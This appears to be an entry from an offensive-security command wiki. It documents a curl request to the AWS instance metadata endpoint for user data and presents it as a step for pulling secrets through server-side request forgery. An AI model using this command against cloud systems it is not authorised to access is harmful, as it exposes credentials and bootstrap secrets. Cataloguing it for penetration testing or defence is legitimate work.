---
id: 28c92e9e-bcf2-4f5b-bcef-feb98758b036
type: command
executor: bash
data: 'curl http://169.254.169.254/latest/user-data'
output: null
created_at: '2023-04-06T03:56:38.437001+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - AWS
  - Linux
tags:
  - ssrf
  - metadata
  - user-data
verified: true
validated: true
---

# curl-aws-metadata-user-data

## Command

```bash
curl http://169.254.169.254/latest/user-data
```

## Description

Fetches user data provided at instance launch, which may include bootstrap scripts, credentials, or configuration. Critical for SSRF to extract secrets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Retrieves user data from IMDS | Yes |

## Examples

### Basic Usage

```bash
curl http://169.254.169.254/latest/user-data
```

## Expected Output

IyEvYmluL2Jhc2gKZWNobyAiSGVsbG8gd29ybGQi
 (Base64-encoded script)

## Related

- [[procedures/Exploit-SSRF-to-Access-Cloud-Metadata]]
- [[commands/curl-do-user-data]]
